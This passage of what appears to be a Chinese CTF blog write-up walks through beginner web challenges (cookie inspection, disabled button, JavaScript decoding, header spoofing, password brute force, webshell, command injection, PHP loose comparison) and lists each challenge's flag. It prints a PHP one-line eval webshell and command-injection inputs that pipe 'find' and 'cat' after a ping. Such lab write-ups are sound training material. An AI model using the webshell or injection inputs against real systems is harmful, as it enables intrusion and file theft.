Cookies，指某些网站为了辨别用户身份、进行 Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。</p><h3 id="工具-4"><a href="#工具-4" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤"></a>步骤</h3><ol><li>使用Firefox打开网页，按下F12，跳转到开发者模式，刷新后，在存储一栏，可看到名为<code>look-here</code>的cookie的值为<code>cookie.php</code>。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564665090877.png" alt="1564665090877"></li><li>访问<code>http://111.198.29.45:42848/cookie.php</code>，提示查看http响应包，在网络一栏，看到访问cookie.php的数据包，点击查看数据包，在消息头内发现flag为<code>cyberpeace{06ebc2f1032b90f947762c560d358194}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564665238648.png" alt="1564665238648"></li></ol><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled button"></a>disabled button</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>前端HTML语言语法</p><h3 id="工具-5"><a href="#工具-5" class="headerlink" title="工具"></a>工具</h3><p>Firefox，HackBar</p><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>使用Firefox打开网页，按下F12，跳转到开发者模式，在查看器窗口审查元素，发现按钮请求使用POST方式，<code>name=&quot;auth&quot;</code>，<code>value=&quot;flag&quot;</code>，<code>disabled=“”</code>。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564666215195.png" alt="1564666215195"></p></li><li><p>直接删除<code>disabled=“”</code>，或者将<code>disabled</code>改为<code>enabled</code>，使按钮变为可点击，点击按钮即获得flag；或者使用HackBar发送<code>auth=flag</code>的POST请求，也可获得flag为<code>cyberpeace{7fe886060fa0b82db931af33971587bd}</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564666694309.png" alt="1564666694309"></p></li></ol><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple js"></a>simple js</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>javascript的代码审计</p><h3 id="工具-6"><a href="#工具-6" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤"></a>步骤</h3><ol><li>使用Firefox打开网页，按下F12，跳转到开发者模式，点击查看器查看源代码，可以发现js代码</li></ol><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564667544538.png" alt="1564667544538"></p><ol start="2"><li><p>进行代码审计，发现不论输入什么都会跳到假密码，真密码位于 <code>fromCharCode</code>中 。</p></li><li><p>使用python处理字符串，得到数组[55,56,54,79,115,69,114,116,107,49,50]，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line"><span class="keyword">print</span> (s)</span><br></pre></td></tr></table></figure></li><li><p>将数字转换成ASCII码得到字符串<code>786OsErtk12</code>，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line">c = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">b = chr(i)</span><br><span class="line">c = c + b</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></li><li><p>根据flag格式提示，得到flag为<code>Cyberpeace{786OsErtk12}</code> 。</p></li></ol><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff referer"></a>xff referer</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>X-Forwarded-For简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p><h3 id="工具-7"><a href="#工具-7" class="headerlink" title="工具"></a>工具</h3><p>Firefox，burpsuite</p><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>使用Firefox打开网页，提示IP地址必须为<code>123.123.123.123</code>。</p></li><li><p>使用burpsuite对Firefox进行代理拦截，在请求头添加<code>X-Forwarded-For: 123.123.123.123</code>，然后放行。收到包显示必须来自<code>https://www.google.com</code>：<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564670056246.png" alt="1564670056246"></p></li><li><p>继续在请求头添加<code>Referer: https://www.google.com</code>，放行后获得flag为<code>cyberpeace{0dd83e102ef7baaee4b1332a71de72e5}</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564670223392.png" alt="1564670223392"></p></li></ol><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak auth"></a>weak auth</h2><h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>弱口令爆破</p><h3 id="工具-8"><a href="#工具-8" class="headerlink" title="工具"></a>工具</h3><p>burpsuite、攻击字典</p><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤"></a>步骤</h3><ol><li>使用Firefox打开网页，尝试输入任意用户名，提示要使用admin账户登录。</li><li>用burpsuite截下登录的数据包。</li><li><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564671594599.png" alt="1564671594599"></li><li>把数据包发送到intruder爆破，设置爆破点为password。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564671901275.png" alt="1564671901275"></li><li>导入攻击字典。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564672033296.png" alt="1564672033296"></li><li>开始攻击，查看响应包列表，发现密码为123456时，响应包的长度和别的不一样。查看响应包，找到flag为<code>cyberpeace{22ee862a8aabe56a849198cd2bd9d2a8}</code>。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564672188609.png" alt="1564672188609"></li></ol><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h3><p>php一句话木马</p><h3 id="工具-9"><a href="#工具-9" class="headerlink" title="工具"></a>工具</h3><p>菜刀</p><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤"></a>步骤</h3><ol><li>打开网页，发现提示<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code> ，为PHP一句话木马。</li><li>使用菜刀连接：<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564710201148.png" alt="1564710201148"></li><li>网站目录下发现了f<code>lag.txt</code>文件：<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564710259022.png" alt="1564710259022"></li><li>查看文件可获得flag为<code>cyberpeace{8733882b6647dada96f18da7f7f56754}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564710354117.png" alt="1564710354117"></li></ol><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command execution"></a>command execution</h2><h3 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h3><p>windows和linux下:<br><code>command1 &amp;&amp; command2</code> 先执行<code>command1</code>后执行<code>command2</code><br><code>command1 | command2</code> 只执行<code>command2</code><br><code>command1 &amp; command2</code> 先执行<code>command2</code>后执行<code>command1</code></p><h3 id="工具-10"><a href="#工具-10" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤"></a>步骤</h3><ol><li>使用Firefox打开网页，在输入框输入<code>ping 111.198.29.45 | find / -name &quot;flag.txt&quot;</code>，寻找flag位置为<code>/home/flag.txt</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564711345518.png" alt="1564711345518"></li><li>继续输入命令<code>ping 111.198.29.45 | cat /home/flag.txt</code>打开flag.txt文件,获得flag为<code>cyberpeace{807ae4792ee2474774421999b765b97e}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564711560625.png" alt="1564711560625"></li></ol><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h2><h3 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h3><p>PHP比较符号<code>===</code>和<code>==</code></p><p><code>===</code>会先比较字符串的类型再比较字符串的值</p><p><code>==</code>会先将字符串换成相同类型，再作比较，属于弱类型比较</p><h3 id="工具-11"><a href="#工具-11" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p><h3 id="步骤-11"><a href="#步骤-11" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>使用Firefox 打开网页，发现PHP代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">0</span> <span class="keyword">and</span> $a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>进行代码审计：通过<code>GET</code>方式传值<code>a</code>和<code>b</code>，需要满足<code>$a==0 &amp;&amp; $a</code>且b不为数字或数字字符串且<code>$b&gt;1234</code>。</p></li><li><p>在URL输入栏中输入<code>http://111.198.29.45:31491/index.php?a=a&amp;&amp;b=1235b</code>，满足审计条件，获得flag为<br><code>Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564713453391.png" alt="1564713453391"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
